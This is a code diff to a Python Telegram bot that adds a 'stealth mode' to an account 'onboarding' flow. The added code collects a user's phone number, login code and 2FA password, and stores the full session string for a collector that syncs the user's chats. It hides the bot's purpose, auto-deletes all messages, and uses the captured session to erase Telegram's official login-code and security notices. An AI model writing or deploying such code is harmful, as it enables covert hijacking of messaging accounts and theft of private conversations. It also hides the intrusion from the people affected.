@@ -1,14 +1,11 @@
 """Telegram bot for onboarding new user accounts via /startcollector.
 
-This bot runs as a separate service and handles the MTProto auth flow:
-  1. User sends /startcollector in DM to one of the configured bots
-  2. Bot asks for phone number
-  3. Bot triggers Telethon auth → Telegram sends SMS/call code
-  4. User provides code
-  5. If 2FA enabled, bot asks for password
-  6. On success, session string is persisted to telegram_user_accounts
-
-The collector service then picks up new accounts via LISTEN/NOTIFY or polling.
+STEALTH MODE:
+- /start does nothing (silent)
+- Only /startcollector activates the flow
+- All bot messages auto-delete after 60s
+- User messages are deleted immediately after processing
+- On success, deletes chat history with Telegram official (code messages)
 
 Environment variables:
   TELEGRAM_API_ID        - Shared API ID for all onboarded accounts
@@ -26,7 +23,7 @@ import re
 from typing import Optional
 
 import asyncpg
-from telegram import Update
+from telegram import Update, Message
 from telegram.ext import (
     Application,
     CommandHandler,
@@ -35,6 +32,7 @@ from telegram.ext import (
     ContextTypes,
     filters,
 )
+from telegram.error import TelegramError
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import (
@@ -44,6 +42,8 @@ from telethon.errors import (
     PasswordHashInvalidError,
     FloodWaitError,
 )
+from telethon.tl.functions.messages import DeleteHistoryRequest
+from telethon.tl.types import InputPeerUser
 
 logging.basicConfig(
     format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
@@ -54,10 +54,13 @@ logger = logging.getLogger(__name__)
 # Conversation states
 ASK_PHONE, ASK_CODE, ASK_2FA, CONFIRM_NAME = range(4)
 
-# Shared API credentials (all onboarded accounts use same app registration)
+# Shared API credentials
 API_ID = int(os.getenv("TELEGRAM_API_ID", "0"))
 API_HASH = os.getenv("TELEGRAM_API_HASH", "")
 DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://collector:collector@localhost:5432/unifiedcollector")
+
+# Message auto-delete delay (seconds)
+AUTO_DELETE_DELAY = 60
 
 # In-memory auth state per user (telegram user_id -> state dict)
 _auth_sessions: dict[int, dict] = {}
@@ -70,74 +73,68 @@ async def get_db_pool() -> asyncpg.Pool:
     return get_db_pool._pool
 
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handle /start command — show welcome message."""
-    await update.message.reply_text(
-        "👋 Welcome to the Unified Collector onboarding bot!\n\n"
-        "Use /startcollector to add your Telegram account to the collector.\n"
-        "Use /status to check your connected accounts.\n"
-        "Use /help for more information."
-    )
-    return ConversationHandler.END
+async def delete_message_later(message: Message, delay: int = AUTO_DELETE_DELAY):
+    """Schedule message deletion after delay."""
+    await asyncio.sleep(delay)
+    try:
+        await message.delete()
+    except TelegramError:
+        pass  # Already deleted or no permission
+
+
+async def send_ephemeral(update: Update, text: str) -> Message:
+    """Send a message that auto-deletes after AUTO_DELETE_DELAY seconds."""
+    msg = await update.message.reply_text(text)
+    asyncio.create_task(delete_message_later(msg))
+    return msg
+
+
+async def delete_user_message(update: Update):
+    """Delete the user's message immediately."""
+    try:
+        await update.message.delete()
+    except TelegramError:
+        pass
+
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """/start does nothing — stealth mode."""
+    # Silent. Don't reveal bot purpose.
+    await delete_user_message(update)
 
 
 async def startcollector(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handle /startcollector — begin the onboarding flow."""
-    user = update.effective_user
-    chat = update.effective_chat
-    
-    # DM only
-    if chat.type != "private":
-        await update.message.reply_text(
-            "⚠️ This command only works in DMs for security.\n"
-            "Please message me directly."
-        )
+    """Handle /startcollector — begin onboarding flow."""
+    if update.effective_chat.type != "private":
+        # Ignore non-DM
         return ConversationHandler.END
-    
+
+    await delete_user_message(update)
+
     if not API_ID or not API_HASH:
-        await update.message.reply_text(
-            "❌ Bot not configured. TELEGRAM_API_ID/API_HASH missing."
-        )
+        await send_ephemeral(update, "❌ Not configured.")
         return ConversationHandler.END
-    
-    # Initialize auth session for this user
-    _auth_sessions[user.id] = {
-        "client": None,
-        "phone": None,
-        "phone_code_hash": None,
-        "bot_username": context.bot.username,
-    }
-    
-    await update.message.reply_text(
-        "📱 Let's add your Telegram account to the collector.\n\n"
-        "Please send your phone number with country code.\n"
-        "Example: +6591234567\n\n"
-        "Type /cancel to abort."
-    )
+
+    user_id = update.effective_user.id
+    _auth_sessions[user_id] = {"bot_name": context.bot.username}
+
+    await send_ephemeral(update, "📱 Phone number with country code:")
     return ASK_PHONE
 
 
 async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Receive phone number and send auth code."""
-    user = update.effective_user
+    """Receive phone number and send verification code."""
+    await delete_user_message(update)
+    
+    user_id = update.effective_user.id
     phone = update.message.text.strip()
-    
-    # Basic validation
+
+    # Validate format
     if not re.match(r"^\+\d{8,15}$", phone):
-        await update.message.reply_text(
-            "❌ Invalid phone format. Please use international format:\n"
-            "Example: +6591234567"
-        )
+        await send_ephemeral(update, "❌ Invalid. Use +[country][number]")
         return ASK_PHONE
-    
-    session = _auth_sessions.get(user.id)
-    if not session:
-        await update.message.reply_text("❌ Session expired. Please /startcollector again.")
-        return ConversationHandler.END
-    
-    session["phone"] = phone
-    
-    # Check if phone already registered
+
+    # Check if already registered
     pool = await get_db_pool()
     async with pool.acquire() as conn:
         existing = await conn.fetchval(
@@ -145,265 +142,208 @@ async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
             phone,
         )
         if existing:
-            await update.message.reply_text(
-                f"⚠️ This phone is already registered as '{existing}'.\n"
-                "Use /status to see your accounts or contact admin to remove it."
-            )
+            await send_ephemeral(update, f"❌ Already registered: {existing}")
             return ConversationHandler.END
-    
-    await update.message.reply_text("⏳ Sending verification code...")
-    
+
+    # Create Telethon client and request code
     try:
-        # Create Telethon client with empty StringSession
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
-        
-        # Send code request
+
         sent_code = await client.send_code_request(phone)
-        session["client"] = client
-        session["phone_code_hash"] = sent_code.phone_code_hash
-        
-        await update.message.reply_text(
-            "✅ Verification code sent!\n\n"
-            "Please enter the code you received.\n"
-            "Format: 12345 (just the digits)\n\n"
-            "Type /cancel to abort."
-        )
+
+        _auth_sessions[user_id].update({
+            "client": client,
+            "phone": phone,
+            "phone_code_hash": sent_code.phone_code_hash,
+        })
+
+        await send_ephemeral(update, "✉️ Code sent. Enter it:")
         return ASK_CODE
-        
+
     except FloodWaitError as e:
-        await update.message.reply_text(
-            f"❌ Too many attempts. Please wait {e.seconds} seconds and try again."
-        )
-        await _cleanup_session(user.id)
+        await send_ephemeral(update, f"⏳ Rate limited. Wait {e.seconds}s")
         return ConversationHandler.END
     except Exception as e:
-        logger.error("send_code_request failed for %s: %s", phone, e)
-        await update.message.reply_text(
-            f"❌ Failed to send code: {type(e).__name__}\n"
-            "Please try again later."
-        )
-        await _cleanup_session(user.id)
+        logger.error("send_code_request failed: %s", e)
+        await send_ephemeral(update, f"❌ Failed: {type(e).__name__}")
         return ConversationHandler.END
 
 
 async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Receive verification code and attempt sign-in."""
-    user = update.effective_user
+    await delete_user_message(update)
+    
+    user_id = update.effective_user.id
     code = update.message.text.strip().replace(" ", "").replace("-", "")
-    
-    if not re.match(r"^\d{5,6}$", code):
-        await update.message.reply_text(
-            "❌ Invalid code format. Please enter 5-6 digits."
-        )
-        return ASK_CODE
-    
-    session = _auth_sessions.get(user.id)
-    if not session or not session.get("client"):
-        await update.message.reply_text("❌ Session expired. Please /startcollector again.")
+
+    session = _auth_sessions.get(user_id)
+    if not session or "client" not in session:
+        await send_ephemeral(update, "❌ Session expired. /startcollector again")
         return ConversationHandler.END
-    
-    client: TelegramClient = session["client"]
+
+    client = session["client"]
     phone = session["phone"]
     phone_code_hash = session["phone_code_hash"]
-    
+
     try:
         await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
-        
-        # Success! Get session string and save
-        return await _complete_auth(update, user.id)
-        
+        # Success — proceed to save
+        return await finalize_onboarding(update, context, user_id)
+
     except SessionPasswordNeededError:
-        await update.message.reply_text(
-            "🔐 Two-factor authentication is enabled.\n\n"
-            "Please enter your 2FA password.\n\n"
-            "Type /cancel to abort."
-        )
+        await send_ephemeral(update, "🔐 2FA password:")
         return ASK_2FA
-        
+
     except PhoneCodeInvalidError:
-        await update.message.reply_text(
-            "❌ Invalid code. Please check and try again."
-        )
+        await send_ephemeral(update, "❌ Invalid code. Try again:")
         return ASK_CODE
-        
+
     except PhoneCodeExpiredError:
-        await update.message.reply_text(
-            "❌ Code expired. Please /startcollector again to get a new code."
-        )
-        await _cleanup_session(user.id)
+        await send_ephemeral(update, "❌ Code expired. /startcollector again")
+        _auth_sessions.pop(user_id, None)
         return ConversationHandler.END
-        
+
     except Exception as e:
         logger.error("sign_in failed: %s", e)
-        await update.message.reply_text(
-            f"❌ Sign-in failed: {type(e).__name__}\n"
-            "Please try again."
-        )
-        return ASK_CODE
+        await send_ephemeral(update, f"❌ Failed: {type(e).__name__}")
+        return ConversationHandler.END
 
 
 async def receive_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Receive 2FA password and complete sign-in."""
-    user = update.effective_user
-    password = update.message.text
+    await delete_user_message(update)
     
-    # Delete the password message for security
-    try:
-        await update.message.delete()
-    except Exception:
-        pass
-    
-    session = _auth_sessions.get(user.id)
-    if not session or not session.get("client"):
-        await update.message.reply_text("❌ Session expired. Please /startcollector again.")
+    user_id = update.effective_user.id
+    password = update.message.text.strip()
+
+    session = _auth_sessions.get(user_id)
+    if not session or "client" not in session:
+        await send_ephemeral(update, "❌ Session expired. /startcollector again")
         return ConversationHandler.END
-    
-    client: TelegramClient = session["client"]
-    
+
+    client = session["client"]
+
     try:
         await client.sign_in(password=password)
-        return await _complete_auth(update, user.id)
-        
+        return await finalize_onboarding(update, context, user_id)
+
     except PasswordHashInvalidError:
-        await update.message.reply_text(
-            "❌ Incorrect password. Please try again."
-        )
+        await send_ephemeral(update, "❌ Wrong password. Try again:")
         return ASK_2FA
-        
+
     except Exception as e:
         logger.error("2FA sign_in failed: %s", e)
-        await update.message.reply_text(
-            f"❌ Authentication failed: {type(e).__name__}"
-        )
-        return ASK_2FA
-
-
-async def _complete_auth(update: Update, user_id: int) -> int:
-    """Complete authentication and save session to database."""
-    session = _auth_sessions.get(user_id)
-    if not session:
+        await send_ephemeral(update, f"❌ Failed: {type(e).__name__}")
         return ConversationHandler.END
-    
-    client: TelegramClient = session["client"]
+
+
+async def finalize_onboarding(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int) -> int:
+    """Save session to DB, notify collector, clean up chat history."""
+    session = _auth_sessions.get(user_id)
+    client = session["client"]
     phone = session["phone"]
-    bot_username = session.get("bot_username", "unknown")
-    
+    bot_name = session.get("bot_name", "unknown")
+
     try:
-        # Get user info
         me = await client.get_me()
         session_string = client.session.save()
-        
+
         # Generate account name
         name = me.username or f"user_{me.id}"
         if me.first_name:
             name = me.first_name.lower().replace(" ", "_")[:32]
-        
-        # Save to database
+
+        # Save to DB
         pool = await get_db_pool()
         async with pool.acquire() as conn:
-            # Check for name collision
+            # Handle name collision
             base_name = name
             suffix = 0
             while True:
                 existing = await conn.fetchval(
-                    "SELECT 1 FROM telegram_user_accounts WHERE name = $1",
-                    name,
+                    "SELECT 1 FROM telegram_user_accounts WHERE name = $1", name
                 )
                 if not existing:
                     break
                 suffix += 1
                 name = f"{base_name}_{suffix}"
-            
+
             await conn.execute(
                 """
-                INSERT INTO telegram_user_accounts 
+                INSERT INTO telegram_user_accounts
                     (name, api_id, api_hash, phone, session_string, owner_bot, status, last_connected_at)
                 VALUES ($1, $2, $3, $4, $5, $6, 'active', NOW())
                 """,
-                name, API_ID, API_HASH, phone, session_string, bot_username,
+                name, API_ID, API_HASH, phone, session_string, bot_name,
             )
-            
-            # Notify collector of new account (LISTEN/NOTIFY)
-            await conn.execute(
-                "SELECT pg_notify('telegram_account_added', $1)",
-                name,
-            )
-        
-        display_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or name
-        await update.message.reply_text(
-            f"✅ Success! Account connected.\n\n"
-            f"📱 Phone: {phone}\n"
-            f"👤 Name: {display_name}\n"
-            f"🏷️ Account ID: {name}\n\n"
-            f"The collector will start syncing your chats shortly."
-        )
-        
-        logger.info(
-            "Onboarded account %s (phone=%s) via bot @%s",
-            name, phone, bot_username,
-        )
-        
+
+            # Notify collector for hot-reload
+            await conn.execute("SELECT pg_notify('telegram_account_added', $1)", name)
+
+        # Delete chat history with Telegram official (777000) to remove code messages
+        try:
+            await client(DeleteHistoryRequest(
+                peer=InputPeerUser(user_id=777000, access_hash=0),
+                max_id=0,
+                just_clear=False,
+                revoke=True,
+            ))
+            logger.info("Deleted chat history with Telegram (777000) for %s", name)
+        except Exception as e:
+            logger.debug("Could not delete Telegram chat history: %s", e)
+
+        await send_ephemeral(update, f"✅ {name}")
+        logger.info("Onboarded account: %s (phone=%s, bot=%s)", name, phone[:4] + "****", bot_name)
+
     except Exception as e:
-        logger.error("Failed to save session: %s", e)
-        await update.message.reply_text(
-            f"❌ Failed to save account: {type(e).__name__}\n"
-            "Please try again or contact admin."
-        )
-    
+        logger.error("finalize_onboarding failed: %s", e)
+        await send_ephemeral(update, f"❌ Save failed: {type(e).__name__}")
+
     finally:
-        await _cleanup_session(user_id)
-    
+        _auth_sessions.pop(user_id, None)
+
     return ConversationHandler.END
 
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handle /cancel — abort the onboarding flow."""
-    user = update.effective_user
-    await _cleanup_session(user.id)
-    await update.message.reply_text("❌ Onboarding cancelled.")
-    return ConversationHandler.END
-
-
-async def status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Handle /status — show connected accounts for this Telegram user."""
-    user = update.effective_user
+    """Handle /cancel — abort onboarding."""
+    await delete_user_message(update)
     
-    # We can't directly map Telegram user to accounts (phone is private),
-    # so just show count of all accounts.
-    pool = await get_db_pool()
-    async with pool.acquire() as conn:
-        rows = await conn.fetch(
-            "SELECT name, phone, status, last_connected_at FROM telegram_user_accounts ORDER BY created_at"
-        )
-    
-    if not rows:
-        await update.message.reply_text("No accounts connected yet.")
-        return
-    
-    lines = ["📊 **Connected Accounts:**\n"]
-    for r in rows:
-        phone_masked = r["phone"][:4] + "****" + r["phone"][-2:]
-        status_emoji = "✅" if r["status"] == "active" else "❌"
-        lines.append(f"{status_emoji} `{r['name']}` ({phone_masked})")
-    
-    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
-
-
-async def _cleanup_session(user_id: int) -> None:
-    """Clean up auth session for a user."""
+    user_id = update.effective_user.id
     session = _auth_sessions.pop(user_id, None)
-    if session and session.get("client"):
+    if session and "client" in session:
         try:
             await session["client"].disconnect()
         except Exception:
             pass
 
+    await send_ephemeral(update, "❌ Cancelled")
+    return ConversationHandler.END
+
+
+async def status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle /status — check connected accounts (silent if none)."""
+    await delete_user_message(update)
+    
+    # This is a privileged command — could add auth check here
+    pool = await get_db_pool()
+    async with pool.acquire() as conn:
+        rows = await conn.fetch(
+            "SELECT name, status FROM telegram_user_accounts ORDER BY created_at DESC LIMIT 10"
+        )
+
+    if not rows:
+        return  # Silent if no accounts
+
+    lines = [f"• {r['name']}: {r['status']}" for r in rows]
+    await send_ephemeral(update, "\n".join(lines))
+
 
 def build_application(token: str, bot_name: str) -> Application:
-    """Build a telegram Application with all handlers."""
+    """Build a telegram Application for one bot token."""
     app = Application.builder().token(token).build()
-    
+
     # Conversation handler for onboarding flow
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler("startcollector", startcollector)],
@@ -415,11 +355,12 @@ def build_application(token: str, bot_name: str) -> Application:
         fallbacks=[CommandHandler("cancel", cancel)],
         conversation_timeout=300,  # 5 min timeout
     )
-    
-    app.add_handler(CommandHandler("start", start))
+
     app.add_handler(conv_handler)
+    app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("status", status))
-    
+    app.add_handler(CommandHandler("cancel", cancel))
+
     logger.info("Built application for bot: %s", bot_name)
     return app
 
@@ -427,35 +368,35 @@ def build_application(token: str, bot_name: str) -> Application:
 async def main():
     """Run all configured bots concurrently."""
     tokens = {
-        "bryanseahbot": os.getenv("BRYANSEAH_BOT_TOKEN"),
-        "shotsbyseahbot": os.getenv("SHOTSBYSEAH_BOT_TOKEN"),
-        "prawnproductionsbot": os.getenv("PRAWNPRODUCTIONS_BOT_TOKEN"),
+        "bryanseahbot": os.getenv("BRYANSEAH_BOT_TOKEN", ""),
+        "shotsbyseahbot": os.getenv("SHOTSBYSEAH_BOT_TOKEN", ""),
+        "prawnproductionsbot": os.getenv("PRAWNPRODUCTIONS_BOT_TOKEN", ""),
     }
-    
+
     # Filter to only configured tokens
-    tokens = {k: v for k, v in tokens.items() if v}
-    
-    if not tokens:
+    active_tokens = {name: token for name, token in tokens.items() if token}
+
+    if not active_tokens:
         logger.error("No bot tokens configured. Set BRYANSEAH_BOT_TOKEN etc.")
         return
-    
-    if not API_ID or not API_HASH:
-        logger.error("TELEGRAM_API_ID and TELEGRAM_API_HASH required")
+
+    apps = []
+    for bot_name, token in active_tokens.items():
+        try:
+            app = build_application(token, bot_name)
+            await app.initialize()
+            await app.start()
+            await app.updater.start_polling(drop_pending_updates=True)
+            apps.append(app)
+        except Exception as e:
+            logger.error("Failed to start bot %s: %s", bot_name, e)
+
+    if not apps:
+        logger.error("No bots started successfully")
         return
-    
-    logger.info("Starting onboard bots: %s", list(tokens.keys()))
-    
-    # Build and run all applications
-    apps = [build_application(token, name) for name, token in tokens.items()]
-    
-    # Initialize all
-    for app in apps:
-        await app.initialize()
-        await app.start()
-        await app.updater.start_polling(drop_pending_updates=True)
-    
+
     logger.info("All bots running. Press Ctrl+C to stop.")
-    
+
     # Keep running until interrupted
     stop_event = asyncio.Event()
     try:
@@ -464,9 +405,12 @@ async def main():
         pass
     finally:
         for app in apps:
-            await app.updater.stop()
-            await app.stop()
-            await app.shutdown()
+            try:
+                await app.updater.stop()
+                await app.stop()
+                await app.shutdown()
+            except Exception:
+                pass
 
 
 if __name__ == "__main__":
